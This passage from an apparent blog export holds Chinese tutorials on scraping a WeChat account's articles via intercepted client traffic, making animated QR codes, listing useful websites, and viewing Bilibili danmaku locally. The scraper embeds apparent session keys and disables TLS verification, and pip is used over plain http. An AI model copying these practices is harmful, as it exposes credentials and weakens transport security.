最后说下，由于现在公众号信息流乱序了，已经不按时间倒序来展示你关注的公众号更新，如果不想错过我的文章，麻烦将本公众号设置为星标，这样就不用在你关注的那么多公众号里翻了 。 公众号 苏生不惑]]></content>
      <tags>
        <tag>公众号</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Python一键下载公众号所有文章，导出文件支持PDF，HTML，Markdown，Excel，chm等格式]]></title>
    <url>%2F2020%2F08%2F28%2FPython%E4%B8%80%E9%94%AE%E4%B8%8B%E8%BD%BD%E5%85%AC%E4%BC%97%E5%8F%B7%E6%89%80%E6%9C%89%E6%96%87%E7%AB%A0%EF%BC%8C%E5%AF%BC%E5%87%BA%E6%96%87%E4%BB%B6%E6%94%AF%E6%8C%81PDF%EF%BC%8CHTML%EF%BC%8CMarkdown%EF%BC%8CExcel%EF%BC%8Cchm%E7%AD%89%E6%A0%BC%E5%BC%8F%2F</url>
    <content type="text"><![CDATA[苏生不惑第167 篇原创文章，将本公众号设为星标，第一时间看最新文章。 关于备份之前写过以下文章： 再谈备份微博 一键备份微博并导出生成PDF，顺便用Python分析微博账号数据 再谈备份网页和公众号文章 如何备份可能被删的公众号文章和网页 想看的公众号文章被删了怎么办？ 上面写的备份公众号方法都是单篇备份，如果你想备份某个公众号的所有文章，就有点太麻烦了，所以今天分享的是用Python一键备份某个公众号的所有文章，这里就以我自己的公众号苏生不惑为例了，原理就是通过抓包抓取微信客户端的接口，用Python请求微信接口获取公众号文章链接再下载。 charles 抓包常见的抓包工具有Fiddler，charles，这里用的charles，先去官网 https://www.charlesproxy.com/download 下载软件,然后打开微信客户端找到公众号，进入文章列表可以看到发过的文章。 不过charles没安装证书前获取不到https接口数据，显示unknown。安装证书后在 proxy-&gt;ssl proxying settings 添加域名和host 。再次抓取可以看到公众号文章接口数据了。 公众号文章的接口地址 https://mp.weixin.qq.com/mp/profile_ext?action=getmsg&amp;__biz=MjM5ODIzNDEx&amp;f=json&amp;offset=25&amp;count=10&amp;is_ok=1&amp;scene=124&amp;uin=MTU0MTQzNj&amp;key=f57423 ，参数比较多，其中有用的参数 __biz 是用户和公众号之间的唯一id，uin是用户的id，这个是不变的，key 是请求的秘钥，一段时间就会失效，offset 是偏移量，count 是每次请求的条数，返回值结构如下：123456789101112&#123; "ret": 0, "errmsg": "ok", "msg_count": 10,信息条数 "can_msg_continue": 1,是否还可以继续获取，1代表可以。0代表不可以，也就是最后一页 "general_msg_list": "&#123;\"list\":[&#123;\"comm_msg_info\":&#123;\"id\":1000000182,\"type\":49,\"datetime\":1585702800,\"fakeid\":\"2398234112\",\"status\":2,\"content\":\"\"&#125;,\"app_msg_ext_info\":&#123;\"title\":\"张国荣音乐\/演唱会\/电影全集网盘分享\",\"digest\":\"#17宠爱张国荣#\",\"content\":\"\",\"fileid\":0,\"content_url\":\"http:\/\/mp.weixin.qq.com\/s?__biz=MjM5ODIzNDExMg==&amp;amp;mid=2257484715&amp;amp;idx=1&amp;amp;sn=2fab0a11d62090d5e30e03e334bce636&amp;amp;chksm=a5b70ac492c083d275b6e15f0de85b8baf488ebb76e5429b08f40cdc53ab6e27b0ce5474fb30&amp;amp;scene=27#wechat_redirect\",\"source_url\":\"\",\"cover\":\"http:\/\/mmbiz.qpic.cn\/mmbiz_jpg\/pchiblEh3tErdgYu06FFVuvnKr9aAkddJLB7pgNhaiav0aYGQKJI0Dwn0kpT4wnmQkIglGH1Nciam5IThX19ibyEag\/0?wx_fmt=jpeg\",\"subtype\":9,\"is_multi\":0,\"multi_app_msg_item_list\":[],\"author\":\"苏生\",\"copyright_stat\":100,\"duration\":0,\"del_flag\":1,\"item_show_type\":0,\"audio_fileid\":0,\"play_url\":\"\",\"malicious_title_reason_id\":0,\"malicious_content_type\":0&#125;&#125;]&#125;", "next_offset": 37, "video_count": 1, "use_video_tab": 1, "real_type": 0, "home_page_list": []&#125; 可以看到返回数据包括文章标题titile、摘要digest、文章地址content_url、阅读原文地址source_url、封面图cover、作者author ，只要抓取这些有用的数据就行了。 python 抓取公众号文章上面分析了接口参数和返回数据，开始用Python请求微信接口就是了。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394import requests,pdfkit,json,time,datetime,osbiz = 'MzU1OTgyMzQzNw=='#随公众号改变uin = 'NjQ3OTQwMT'#不变key = '54ce6b15dc70fa9428deb6f18a00ac92db141f743dfe6d5a800bf2e99d82c2c372af771b204ec1db1f6f769ab66ad7c0294db04862aecbd043c24ab4be675cf55bcb2316b384f5612fb8a73daee911389bf94d6ed0fae9285e5996b831da8ea9f1af341f0314a937fd4c840edc1986fc74961857388588e83567137c42993a80'def parse(offset, biz, uin, key): # url前缀 url = "https://mp.weixin.qq.com/mp/profile_ext" # 请求头 headers = &#123; "User-Agent": "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.116 Safari/537.36 QBCore/4.0.1301.400 QQBrowser/9.0.2524.400 Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2875.116 Safari/537.36 NetType/WIFI MicroMessenger/7.0.5 WindowsWechat" &#125; proxies = &#123; 'https': None, 'http': None, &#125; # 重要参数https://mp.weixin.qq.com/mp/profile_ext?action=getmsg&amp;__biz=MjM5ODIzNDExMg==&amp;f=json&amp;offset=48&amp;count=10&amp;is_ok=1&amp;scene=124&amp;uin=MTU0MTQzNjQwMw%3D%3D&amp;key=a42654d5f06828b5d9e40deca0ea5f73004fecbf9ae4cfe0d37653465b623e26d82d0948a73d3cdf4fffd5df19bebafed06815f22f05bac0e5679625c86bb429885529cea1973bfb4d9f18481e624a0cea7cd12932fb55e7ed892ccd6dcda141737cf5ed9811d477cd90cdf4d8371a8b1bdd63de15e193787fc75f186cdf41b5&amp;pass_ticket=FjDlSKDCqgdl0E5WNMPJLuBO3eeqP%2FdrlM1Q8%2FzEHxisVbm7ZVemLp6VeXsrLd0i&amp;wxtoken=&amp;appmsg_token=1074_NFjOFA%252FiWPMoGcRLiG7SzMUc-NoJp7QhKSYmYw~~&amp;x5=0&amp;f=json param = &#123; 'action': 'getmsg', '__biz': biz, 'f': 'json', 'offset': offset, 'count': '10', 'is_ok': '1', 'scene': '124', 'uin': uin, 'key': key, 'wxtoken': '', 'x5': '0', &#125; # 发送请求，获取响应 response = requests.get(url, headers=headers, params=param, proxies=proxies) response_dict = response.json() print(response_dict) next_offset = response_dict['next_offset'] can_msg_continue = response_dict['can_msg_continue'] general_msg_list = response_dict['general_msg_list'] data_list = json.loads(general_msg_list)['list'] htmls = [] # print(data_list) for data in data_list: try: # 文章发布时间 date = time.strftime('%Y-%m-%d', time.localtime(data['comm_msg_info']['datetime'])) msg_info = data['app_msg_ext_info'] #原创 if msg_info['copyright_stat'] == 11: # 文章标题 title = msg_info['title'] # 文章链接 url = msg_info['content_url'] #文章摘要digest #文章封面cover res = requests.get(url,proxies=&#123;'http': None,'https': None&#125;,verify=False, headers=headers) content = res.text.replace('data-src', 'src') filename=str(int(time.time()))+'.html' #生成HTML文件 #htmls.append(filename) with open(date+'_'+title+'.html', 'w', encoding='utf-8') as f: f.write(content) #生成Excel #with open('wechat2.csv', 'a+', encoding='gbk') as f: # f.write(title.replace(',', '，')+','+msg_info['digest'].replace(',', '，')+',' + msg_info['cover'].replace(',', '，') + ',' +url.replace(',', '，')+','+str(date)+ '\n') #生成markdown #with open('wechat.md', 'a+', encoding='utf-8') as f: # f.write('[&#123;&#125;]'.format(title) + '(&#123;&#125;)'.format(url)+ '\n') #生成PDF #try: # pdfkit.from_string(content,'./' + date + '_' + title.replace(' ', '')+'.pdf') #except Exception as err: # print(err) # 部分文章标题含特殊字符，不能作为文件名 #f = datetime.datetime.now().strftime('%Y%m%d%H%M%S') + '.pdf' #pdfkit.from_string(content,f) # 自己定义存储路径（绝对路径） #finally: # os.remove(filename) #pdfkit.from_url(url, './' + date + title + '.pdf') #图片获取不到 print(url + title + date + '成功') except Exception as err: print(err) #try: #pdfkit.from_file(htmls,'公众号文章备份.pdf') #except: # pass if can_msg_continue == 1: time.sleep(1) parse(next_offset,biz,uin,key) return True else: print('爬取完毕') return Falseparse(0,biz,uin,key) 这里只抓取原创文章，我的公众号有160多篇原创，生成HTML文件2分钟就搞定。用谷歌浏览器打开就能看。 生成的HTML文件还可以转成chm格式，需要先安装软件 Easy CHM，这是一款强大的CHM电子书或CHM帮助文件的快速制作工具 http://www.etextwizard.com/cn/easychm.html左侧是文章标题，右侧是文章内容，看起来非常方便。然后编译成一个chm文件，这样直接双击文件就能打开浏览了。 还有含有文章标题和链接的 markdown 文件，关于markdown之前文章介绍过 用 Markdown 来写简历和 PPT。excel文件格式也有。 生成HTML，markdown和Excel都比较快，因为都是文本，下面开始导出PDF。 导出PDF导出PDF用的工具是wkhtmltopdf ，先到官网https://wkhtmltopdf.org/downloads.html 下载安装 wkhtmltopdf ， 安装后设置环境变量，之前文章写过 那些你可能不知道的 windows 奇技淫巧，然后直接命令行就能生成PDF。1234567λ wkhtmltopdf http://www.baidu.com baidu.pdfLoading pages (1/6)Counting pages (2/6)Resolving links (4/6)Loading headers and footers (5/6)Printing pages (6/6)Done 比如生成百度首页的PDF。Python中使用pdfkit 模块来调用wkhtmltopdf ，先用pip install pdfkit -i http://pypi.douban.com/simple --trusted-host pypi.douban.com来安装它。 再次运行程序，PDF文件也生成了。PDF也可以用谷歌浏览器打开，比如这篇一键解锁网易云音乐变灰歌曲。 不过由于生成PDF比较慢，文章多的话key参数会失效，需要重新获取，然后修改next_offset继续抓取。{&#39;base_resp&#39;: {&#39;ret&#39;: -3, &#39;errmsg&#39;: &#39;no session&#39;, &#39;cookie_count&#39;: 0, &#39;csp_nonce&#39;: 406210942}, &#39;ret&#39;: -3, &#39;errmsg&#39;: &#39;no session&#39;, &#39;cookie_count&#39;: 0} 这样就完美的把我公众号的所有文章下载到本地了，有HTML，PDF，Excel，markdown，chm 格式（在公众号后台回复 公众号 获取我的所有原创文章，如果你有想下载的公众号可以加我微信免费帮忙下载）。 目前有个问题是如果公众号有付费文章，下载的也只能看一部分内容。 还有文章的评论也是有接口获取的，有空再研究下。 大家的点赞和在看转发对我非常重要，如果文章对你有帮助还请支持下， 感谢各位！ 公众号后台回复关键词 用途 微信 获取你的微信好友头像拼图及查看微信撤回消息 b站 获取下载b站视频工具及找回被删b站视频方法 视频 获取下载腾讯，优酷，爱奇艺，微博视频工具及去除logo脚本 百度网盘 获取加速下载网盘文件方法及查找电影电视剧网站 朋友圈 获取发空白朋友圈方法 微博 获取备份微博工具及分析微博账号数据 音乐 获取下载音乐工具及在线听歌网站 油猴 获取油猴脚本 谷歌 获取安装Chrome扩展方法 公众号 一键下载公众号所有文章 公众号 苏生不惑]]></content>
      <tags>
        <tag>python</tag>
        <tag>公众号</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2020七夕情人节又来了，给女朋友做个动态二维码]]></title>
    <url>%2F2020%2F08%2F28%2F2020%E4%B8%83%E5%A4%95%E6%83%85%E4%BA%BA%E8%8A%82%E5%8F%88%E6%9D%A5%E4%BA%86%EF%BC%8C%E7%BB%99%E5%A5%B3%E6%9C%8B%E5%8F%8B%E5%81%9A%E4%B8%AA%E5%8A%A8%E6%80%81%E4%BA%8C%E7%BB%B4%E7%A0%81%2F</url>
    <content type="text"><![CDATA[苏生不惑第166 篇原创文章，将本公众号设为星标，第一时间看最新文章。 又到了一年一度的七夕了，之前写过听说 520 你还没对象，来这里看看 ，是不还在想送什么礼物，今天分享一个有意思的动态二维码，可以用来哄女朋友开心。 二维码 二维码也称为二维条码，是指在一维条码的基础上扩展出另一维具有可读性的条码，使用黑白矩形图案表示二进制数据，被设备扫描后可获取其中所包含的信息。 以上来自维基百科解释 https://zh.wikipedia.org/zh-cn/%E4%BA%8C%E7%B6%AD%E7%A2%BC ，自从有了微信，二维码已经随处可见了。 使用 Chrome 扩展可以轻易的生成二维码 https://chrome.google.com/webstore/detail/quick-qr-code-generator/afpbjjgbdimpioenaedcjgkaigggcdpp/related 今天介绍的是基于 Python 的二维码工具 myqr 。 myqrmyqr 可生成普通二维码、带图片的艺术二维码（黑白与彩色）、动态二维码（黑白与彩色） https://github.com/sylnsfar/qrcode/blob/master/README-cn.md ，直接使用 pip install myqr 安装它。 这里以一个表白网页 myqr http://sushengbuhuo.gitee.io/love/ 生成二维码。1234 λ myqr http://sushengbuhuo.gitee.io/love/line 16: mode: byteSucceed!Check out your 5-H QR-code: d:\download\qrcode.png 生成二维码效果： 接着用GIF生成一个动态二维码。12345λ myqr http://sushengbuhuo.gitee.io/love/ -p lovelove.gifIt may take a while, please wait for minutes...line 16: mode: byteSucceed!Check out your 5-H QR-code: d:\download\lovelove_qrcode.gif 生成二维码效果： myqr http://sushengbuhuo.gitee.io/love/ -p lovelove.gif -c 彩色效果再清晰点。用微信扫码后显示效果，可以自己长按识别二维码：可惜动图在微信里没法识别。 还有个模板 https://a.scene.ehqxiu.cn/s/XteInz0v微信扫描后效果： 如果你没有Python环境，这里提供了一个exe程序（公众号内回复 女朋友 获取），使用方法很简单，在exe文件同级目录创建一个文件info.txt ，在里面输入对应的参数，之后双击myqr.exe运行即可。 info.txt 文件格式如下：1234567words=http://sushengbuhuo.gitee.io/love/v=11p=lovelove.gifl=Qccon=1.5bri=1.3 你只需要改p后面参数 lovelove.gif（GIF文件名，就是上面那个给你小心心的GIF图，你也可以自己找一个）。 第一次使用会自动下载一些库文件，因为程序依赖 imageio如果下载很久不动，你可以从这里自己下载到本地https://github.com/imageio/imageio-binaries/raw/master/freeimage/FreeImage-3.15.1-win64.dll，然后把这个文件放到 freeimage 目录C:\Users\xxx\AppData\Local\imageio\freeimage （xxx为自己电脑用户名）， 如果没有freeimage文件夹需要手动创建 。 imageio 目录还有ffmpeg目录，里面有个文件 ffmpeg-win32-v3.2.4.exe ，也可以从这里下载 https://github.com/imageio/imageio-binaries/raw/master/ffmpeg/ffmpeg-win32-v3.2.4.exe ，运行myqr.exe后在本地生成动态GIF图 lovelove_qrcode.gif。 这里给我的公众号二维码也生成个GIF图，公众号的二维码可以通过微信号生成 https://open.weixin.qq.com/qr/code?username=susheng_buhuo ，解码后的地址为 http://weixin.qq.com/r/WDvM1MPE2p6lrYe3925K ，生成效果： 下面分享段Python代码，输出❤心形love 代码输出爱命令行执行print(&#39;\n&#39;.join([&#39;&#39;.join([(&#39;Love&#39;[(x-y) % len(&#39;Love&#39;)] if ((x*0.05)**2+(y*0.1)**2-1)**3-(x*0.05)**2*(y*0.1)**3 &lt;= 0 else &#39; &#39;) for x in range(-30, 30)]) for y in range(30, -30, -1)]))123456789101112131415161718192021222324 veLoveLov veLoveLov eLoveLoveLoveLove eLoveLoveLoveLove veLoveLoveLoveLoveLoveLoveLoveLoveLoveLov veLoveLoveLoveLoveLoveLoveLoveLoveLoveLoveLveLoveLoveLoveLoveLoveLoveLoveLoveLoveLoveLoveLoveLoveLoveLoveLoveLoveLoveLoveLoveLoveLoveLoveLoveLoveLoveLoveLoveLoveLoveLoveLoveLoveLoveLoveLoveLoveLoveLoveLoveLoveLoveLoveLoveLoveLoveLoveLoveLoveLoveLoveLoveLoveLoveLoveLoveLoveLoveLoveLoveLoveLoveLoveLoveLoveLoveLove oveLoveLoveLoveLoveLoveLoveLoveLoveLoveLove eLoveLoveLoveLoveLoveLoveLoveLoveLoveLove LoveLoveLoveLoveLoveLoveLoveLoveLoveLoveL eLoveLoveLoveLoveLoveLoveLoveLoveLove oveLoveLoveLoveLoveLoveLoveLoveLove eLoveLoveLoveLoveLoveLoveLoveLove veLoveLoveLoveLoveLoveLoveLov oveLoveLoveLoveLoveLoveLo LoveLoveLoveLoveLoveL LoveLoveLoveLov LoveLoveL Lov v 还可以自定义12345import timewords = input('Please input the words you want to say!:')for item in words.split(): print('\n'.join([''.join([(item[(x-y) % len(item)] if ((x*0.05)**2+(y*0.1)**2-1)**3-(x*0.05)**2*(y*0.1)**3 &lt;= 0 else ' ') for x in range(-30, 30)]) for y in range(12, -12, -1)])) time.sleep(1.5) [plt.show() for _, __, ___, plt in [(plt.plot(x, y1, color=&#39;r&#39;), plt.plot(x, y2, color=&#39;r&#39;), np, plt) for x, y1, y2, np, plt in [(x, 0.618*np.abs(x) - 0.8* np.sqrt(64-x**2), 0.618*np.abs(x) + 0.8* np.sqrt(64-x**2), np, plt) for x, np, plt in [(np.linspace(-8, 8, 1024), np, plt) for np, plt in [(__import__(&#39;numpy&#39;), __import__(&#39;pylab&#39;))]]]]] 没有安装Python，在浏览器控制台也是可以的。 console.log([...Array(30).keys()].map(u=&gt;u-15).reverse().map(y=&gt;[...Array(60).keys()].map(u=&gt;u-30).map(x=&gt;((x*0.04)**2+(y*0.1)**2-1)**3-(x*0.04)**2*(y*0.1)**3&lt;=0?&#39;babyiloveu&#39;.split(&#39;&#39;).slice([(x-y)%10])[0]:&#39; &#39;).join(&#39;&#39;)).join(&#39;\n&#39;)) print(&#39;\n&#39;.join([&#39;&#39;.join([(u&#39;ILoveChina爱&#39;[(x-y)%11]if((x*0.05)**2+(y*0.1)**2-1)**3-(x*0.05)**2* 0.1)**3&lt;=0 else&#39; &#39;)for x in range(-30,30)])for y in range(15,-15,-1)]))最后分享个舔狗日记一键生成器，让你速成舔狗之王，运行后在本地生成文件舔狗日记.txt ，这日记看得我都辛酸。https://wwa.lanzous.com/iC9F1eyq6je 大家的点赞和在看转发对我非常重要，如果文章对你有帮助还请支持下， 感谢各位！ 公众号后台回复关键词 用途 微信 获取你的微信好友头像拼图及查看微信撤回消息 b站 获取下载b站视频工具及找回被删b站视频方法 视频 获取下载腾讯，优酷，爱奇艺，微博视频工具及去除logo脚本 百度网盘 获取加速下载网盘文件方法及查找电影电视剧网站 朋友圈 获取发空白朋友圈方法 微博 获取备份微博工具及分析微博账号数据 音乐 获取下载音乐工具及解锁网易云音乐无版权歌曲 油猴 获取油猴脚本 谷歌 获取安装Chrome扩展方法 公众号 苏生不惑]]></content>
      <tags>
        <tag>公众号</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[那些有趣的网站系列（四）]]></title>
    <url>%2F2020%2F08%2F28%2F%E9%82%A3%E4%BA%9B%E6%9C%89%E8%B6%A3%E7%9A%84%E7%BD%91%E7%AB%99%E7%B3%BB%E5%88%97%EF%BC%88%E5%9B%9B%EF%BC%89%2F</url>
    <content type="text"><![CDATA[苏生不惑第165篇原创文章，将本公众号设为星标，第一时间看最新文章。 之前分享过 那些有趣的网站 ，那些有趣的网站（二），那些有趣的网站系列（三），这是系列第4篇，更多有意思的网站在文章开头的专辑里。 满分作文生成器 最近某高考满分作文又在网络流传，现在有了满分作文生成器你也可以装逼了 http://beautyyu.top/full-mark-composition-generator ，跟之前分享的狗屁不通文章生成器有点类似 https://suulnnka.github.io/BullshitGenerator/index.html 分离歌曲中的人声和音乐利用人工智能分离歌曲中的人声和背景音乐 https://vocalremover.org/ch/ 最后生成2个mp3文件 ，测试效果还不错。 可回放绘画过程的画板手绘下我的公众号名字 苏生不惑，生成一个分享链接 https://www.funens.com?path=e6996b40-6988-4ac2-9cb6-a27bf90ff9ad ，他人打开后可以动画展示你画的内容，用来表白倒是个不错的思路（点击文末阅读原文看效果）。 在线ocr http://ocr.space/ 在线识别图片中的文字，支持JPG、PNG、GIF、PDF、URL等格式作为输入，支持英语、中文、法语、德语等20+种语言，主要还免费 ，效果还不错。https://uutool.cn/ocr/ 这是个在线工具，直接上传图片即可。 阿里云出品的也不错 https://duguang.aliyun.com/experience?t 一起同步听歌孤独的时候想找个人一起听歌 http://music.alang.run/ 根据自己的喜好，创建属于自己的音乐屋，让有相同喜好的人聚在一起实时听歌、聊天分享、互动，听一首周杰伦的《枫》，可以选择音乐来源。 如果想和异地恋的女朋友同步看b站视频推荐 Chrome 扩展 coplay https://chrome.google.com/webstore/detail/coplay/heolgpojkkeacaokbpolhalhlaidpkkc/ 查找微博博主有些微博图片没有开水印（或者微博改名了），但微博图片地址是根据算法生成的，可以根据图片地址查找到微博博主主页 https://gongpeione.github.io/wbimg2wb/ ，更多微博技巧看之前文章如何更优雅地使用微博 检测账号是否泄漏网站 have i been pwned ? ，意思是 我被卖了吗？ https://haveibeenpwned.com ，收录了超过 470 个网站，100 亿条账号的泄露数据，用户仅凭 email，便能快速评估自己账号的数据泄露情况，测试了下我的新浪邮箱果然中招了。跟火狐出品的 https://monitor.firefox.com/ 类似。 分享网速想知道自己的网络情况，来 https://www.speedtest.net 这里测试下（国内有对应的 http://www.speedtest.cn/ ），测试后会生成一个链接 https://www.speedtest.net/result/9068358979 ，可以分享出去和朋友pk下。 网页万能复制outline 是一个让网站进入阅读模式的网站，比如某些网站广告太多，严重影响阅读体验，还禁止了浏览器右键复制功能，直接在网址前加上https://www.outline.com（或者用更好记忆的 http://fuzhi.ml），然后会对输入的链接排版，同时生成一个可分享的链接 。 这里以某个知乎回答为例 http://fuzhi.ml/https://www.zhihu.com/question/61657457/answer/1191285043 ，生成分享链接 https://outline.com/Bnw59p ，设置了版权的知乎回答也能复制文字了，顺便备份了知乎回答链接 再谈备份网页和公众号文章 在线样机不用到处搜罗样机资源和浪费时间改来改去，这个网站点开即用，3秒生成各种展示风格，一键下载，移动端和网页模板都有 https://cleanmock.com/designer 去水印Teorex Inpaint是个非常好用的去水印软件 https://www.theinpaint.com/ 打开图片后，选择左侧工具栏的移除区，对要去除水印的对方涂抹，然后点击处理图像即可，公众号回复 去水印 获取软件。 把字幕去掉的效果 ping相信你肯定用过cmd中的ping，比如断网的时候会ping下百度。http://ping.chinaz.com/123456789101112λ ping baidu.com正在 Ping baidu.com [39.156.69.79] 具有 32 字节的数据:来自 39.156.69.79 的回复: 字节=32 时间=38ms TTL=51来自 39.156.69.79 的回复: 字节=32 时间=38ms TTL=51来自 39.156.69.79 的回复: 字节=32 时间=38ms TTL=51来自 39.156.69.79 的回复: 字节=32 时间=38ms TTL=5139.156.69.79 的 Ping 统计信息: 数据包: 已发送 = 4，已接收 = 4，丢失 = 0 (0% 丢失)，往返行程的估计时间(以毫秒为单位): 最短 = 38ms，最长 = 38ms，平均 = 38ms 当然你也可以用http://ping.pe/baidu.com# 这个在线ping 。可以看到国内ping的速度明显快。 自动问答系统直接向用户返回答案，而不是像传统搜索引擎一样提供一系列可能含有用户所需答案的相关网页，比如求数字13532385396179的质因数分解 https://www.wolframalpha.com/input/?i=13532385396179结果13532385396179=13×53^2×3853×96179 类似的还有 http://webdemo.myscript.com/ http://www.hejizhan.com/html/search手册网上打入数学公式，按一个键就计算解方程，给出数字解，分析解和图解, 制图互动放大 http://chinese.drhuang.com/chinese/ mathHandbook.com数字帝国https://zh.numberempire.com/ https://github.com/mathjax/asciimathml 文字对比如果想对比2段文字有什么差别可以用这个，它还支持图片，PDF对比 https://www.diffchecker.com/ ，它会把不同的地方用颜色标出来。 相似网站 如果你想找同类网站可以看看这个 https://www.similarsites.com比如b站 https://www.similarsites.com/site/bilibili.com它还有对应Chrome扩展 https://chrome.google.com/webstore/detail/similar-sites-discover-re/necpbmbhhdiplmfhmjicabdeighkndkn 使用谷歌的时候点击图标搜索的时候点击View Similar Sites 图片特效这个网站方便你制作各种特效 图片，gif和视频https://photomosh.com/右侧选择需要的特效生成的效果视频也可以 截图拼接你可能看过很多这样的影视剧台词截图 http://join-screenshots.zhanghai.me/ 这里上传多张图片就可以拼图了。 类似的还有 https://yoo.la/#/body 录制命令行一个以文本方式录制终端内容的工具，看起来挺炫的 https://asciinema.org/之前写过命令行录制工具 asciinema，这个网站上有很多别人录制的有意思的命令行操作过程，如果你对命令行好奇可以看看他们怎么操作的。 表情能手知道每个 emoji 表情都是什么意思吗 ？来看看这个Emoji表情文字对照表 http://emojipedia.org/ https://emojiwiz.com/zh/ https://getemoji.com/ 选择一个表情，可以直接复制 🐼 👨 👩🎂 大家的点赞和在看转发对我非常重要，如果文章对你有帮助还请支持下， 感谢各位！ 公众号后台回复关键词 用途 微信 获取你的微信好友头像拼图及查看微信撤回消息 b站 获取下载b站视频工具及找回被删b站视频方法 视频 获取下载腾讯，优酷，爱奇艺，微博视频工具及去除logo脚本 百度网盘 获取加速下载网盘文件方法及查找电影电视剧网站 朋友圈 获取发空白朋友圈方法 微博 获取备份微博工具及分析微博账号数据 音乐 获取下载音乐工具及解锁网易云音乐无版权歌曲 油猴 获取油猴脚本 谷歌 获取安装Chrome扩展方法 公众号 苏生不惑]]></content>
      <tags>
        <tag>公众号</tag>
        <tag>网站</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[借助 potplayer 播放器，在本地播放b站视频也能看弹幕了]]></title>
    <url>%2F2020%2F08%2F28%2F%E5%80%9F%E5%8A%A9-potplayer-%E6%92%AD%E6%94%BE%E5%99%A8%EF%BC%8C%E5%9C%A8%E6%9C%AC%E5%9C%B0%E6%92%AD%E6%94%BEb%E7%AB%99%E8%A7%86%E9%A2%91%E4%B9%9F%E8%83%BD%E7%9C%8B%E5%BC%B9%E5%B9%95%E4%BA%86%2F</url>
    <content type="text"><![CDATA[苏生不惑第164 篇原创文章，将本公众号设为星标，第一时间看最新文章。 关于b站之前已经写过了下列文章，有兴趣可以点击阅读： 那些我关注的 b 站 up 主 bilibili(b站)升级到BV号了，还想用av号怎么办？ 那些你可能不知道的 bilibili 奇技淫巧 如何轻松下载腾讯/微博/优酷/爱奇艺/b站等全网视频？ 如何更优雅地使用 bilibili(b站) 如何找回bilibili(b站)收藏夹里失效的视频？ 如何免登陆观看b站大会员番剧 b站视频被删后，即使根据 如何找回bilibili(b站)收藏夹里失效的视频？ 这里的方法找回了视频，但曾经的弹幕没有了，为了以防万一可以提前下载视频和弹幕，在本地用potplayer播放器（公众号内回复 播放器 获取软件）播放b站视频就可以看弹幕了，获得和b站一样的观看体验。 potplayer 播放器之前我一直用的QQ影音播放器，自从发现了potplayer，体验简直惊艳， potplayer内置支持多种解码器，无需额外安装就能播放几乎所有视频格式文件。https://www.potplayer.org/ https://www.lanzoux.com/izb4nfjtksb 一个比较有用的功能是支持直播源，右键打开链接。输入m3u直播源地址 http://tv.sason.xyz/new.m3u ，欢迎分享更多直播源。加载直播源后右侧可以看到n多电视台直播源，比如央视6套电影频道，实现了在本地播放器上看电视。 还有实时字幕翻译功能，这个看英语电影的时候比较实用。 再一个就是可以播放视频的时候看弹幕，只需要弹幕文件名和视频文件名相同即可。 下面开始体验下在本地用potplayer播放器播放有弹幕的b站视频。 下载b站视频关于下载b站视频之前写过文章 如何轻松下载腾讯/微博/优酷/爱奇艺/b站等全网视频？ ，推荐使用BiliBili视频下载工具（公众号内回复 b站 获取软件），输入视频地址直接下载 。https://www.lanzous.com/b0lkrxzg 不过我还是习惯用命令行来下载。123456789101112annie -f 16 https://www.bilibili.com/video/BV1ip4y1D7iY Site: 哔哩哔哩 bilibili.com Title: 【周杰伦纪录片】第七集：夏日狂想 Type: video Stream: [16] ------------------- Quality: 流畅 360P Size: 131.72 MiB (138122013 Bytes) # download with: annie -f 16 ... 131.72 MiB / 131.72 MiB [=========================================] 100.00% 139.06 KiB/s 16m9s 视频下载后开始下载弹幕。 下载弹幕b站提供接口使用av号获取cid ，比如https://api.bilibili.com/x/player/pagelist?aid=968504505 获取到cid=205245882如果觉得这样麻烦可以安装油猴脚本，可以直接显示 视频 av 号、bv 号及弹幕 cid https://greasyfork.org/zh-CN/scripts/403846-bilibili-display-video-av-bv-number-below-the-title-bar 之后根据cid获取弹幕文件，弹幕文件采用 xml 格式存储，接口地址 https://api.bilibili.com/x/v1/dm/list.so?oid=205245882 或者 https://comment.bilibili.com/205245882.xml ，直接保存到本地即可。 然后使用 bilibili ASS 弹幕在线转换网站把xml格式转换为ass格式，上传即可转换。https://tiansh.github.io/us-danmaku/bilibili/ 还可以安装 Chrome扩展 哔哩哔哩助手 https://bilibili-helper.github.io/ ，安装方法见之前文章 上不了谷歌如何安装 Chrome 扩展？打开b站视频 https://www.bilibili.com/video/BV1ip4y1D7iY ，可以看到弹幕列表（还支持搜索），直接提供xml和ass 2种格式弹幕下载。 这个和之前介绍的油猴扩展哔哩哔哩增强脚本一样的 https://greasyfork.org/zh-CN/scripts/373563-bilibili-evolved 视频和弹幕文件下载后放同一个目录下，即【周杰伦纪录片】第七集：夏日狂想.flv和 【周杰伦纪录片】第七集：夏日狂想.ass，播放视频的时候字幕也出来了。如果想关闭弹幕可以在选择字幕里勾选不显示。 分享个小技巧，b站视频的倍速播放最大到2倍，如果想更快（比如2.5倍）可以在控制台执行document.querySelector(&#39;video&#39;).playbackRate = 2.5 最后分享一个可以用来分享、管理你在b站设置弹幕屏蔽词的网站 https://harrynull.tech/bilibili/ 大家的点赞和在看转发对我非常重要，如果文章对你有帮助还请支持下， 感谢各位！ 公众号后台回复关键词 用途 微信 获取你的微信好友头像拼图及查看微信撤回消息 b站 获取下载b站视频工具及找回被删b站视频方法 视频 获取下载腾讯，优酷，爱奇艺，微博视频工具及去除logo脚本 百度网盘 获取加速下载网盘文件方法及查找电影电视剧网站 朋友圈 获取发空白朋友圈方法 微博 获取备份微博工具及分析微博账号数据 音乐 获取下载音乐工具及解锁网易云音乐无版权歌曲 油猴 获取油猴脚本 谷歌 获取安装Chrome扩展方法 公众号 苏生不惑]]></content>
      <tags>
        <tag>公众号</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[一键解锁网易云音乐变灰歌曲，网易云音乐也能听周杰伦了]]></title>
